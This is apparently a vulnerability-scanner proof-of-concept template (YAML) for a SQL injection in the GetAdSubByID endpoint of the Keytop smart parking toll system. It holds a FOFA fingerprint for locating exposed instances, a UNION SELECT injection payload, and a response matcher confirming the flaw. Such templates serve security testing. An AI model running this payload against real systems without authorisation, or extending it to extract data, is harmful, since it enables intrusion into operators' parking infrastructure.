id: poc-yaml-keytop-toll-system-getadsubbyid-sqli
info:
  name: 科拓全智能停车收费系统 GetAdSubByID SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 科拓全智能停车收费系统
  fofa: body="/KT_Css/qd_defaul.css"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: POST
  path: /Webservice.asmx/GetAdSubByID
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: AID=1 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7e,MD5({{.t1}}),0x7e),NULL--
    -
  expression: "status_code == 200 && \ncontains(body,`','`) &&\ncontains(body,t2)\
    \ &&\ncontains(content_type,\"text/xml\")\n"
transport: http
